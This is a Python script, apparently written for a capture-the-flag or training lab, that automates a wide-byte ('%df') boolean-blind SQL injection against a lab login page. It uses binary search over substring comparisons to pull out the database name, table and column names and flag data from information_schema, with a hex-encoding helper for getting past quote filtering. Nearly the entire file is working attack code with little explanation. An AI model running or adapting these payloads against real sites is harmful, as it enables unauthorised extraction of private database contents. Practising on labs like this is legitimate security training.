import time
from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://inject2.lab.aqlab.cn:81/Pass-15/index.php?id=0'
flag_success = 'Your Login nam'

payload1_database_length = '%df\' or length(database())={}%23'
payload_database = '%df\' or ord(substr(database(),{},1))>{}%23'
payload_table = '%df\' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}%23'
payload_column = '%df\' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name={}),{},1))>{}%23'
payload_data = '%df\' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}%23'

start_time = time.time()

session = HTMLSession()
proxies = {}


def go(title, payload):
    db = ''
    for i in range(1, 128):
        s = search(i, payload)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print(f'{title} = ', db)


def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        sql = url + payload.format(index, mid)
        res = session.get(sql)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)

def h(txt):
    return '0x' + txt.encode().hex()

if __name__ == '__main__':
    table_name = 'china_flag'  # 这里用16进制绕过，需要去掉两侧""
    column_name = 'flaglo'

    go('database', payload_database)  # 'widechar'
    # go('table', payload_table)  # 'china_flag'
    # go('column', payload_column.format(h(table_name), '{}', '{}'))  # Id,flaglo
    # go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
